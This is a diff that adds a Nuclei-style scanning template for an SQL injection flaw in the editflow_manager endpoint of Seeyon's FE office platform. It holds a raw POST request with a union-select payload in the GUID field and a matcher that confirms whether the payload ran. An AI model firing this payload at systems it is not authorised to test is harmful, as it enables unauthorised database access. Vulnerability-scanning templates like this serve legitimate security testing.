@@ -1,0 +1,26 @@
+id: FE-editflow-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 致远互联FE协作办公平台editflow_manager存在sql注入漏洞
+  reference:
+    - https://github.com/wy876/POC/blob/3731c2067d80483223603737037eff2ed3c44425/%E8%87%B4%E8%BF%9C%E4%BA%92%E8%81%94FE%E5%8D%8F%E4%BD%9C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0editflow_manager%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /sysform/003/editflow_manager.js%70 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Connection: close
+        Content-Length: 41
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip
+
+        option=2&GUID=-1'+union+select+111*222--+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '24642'
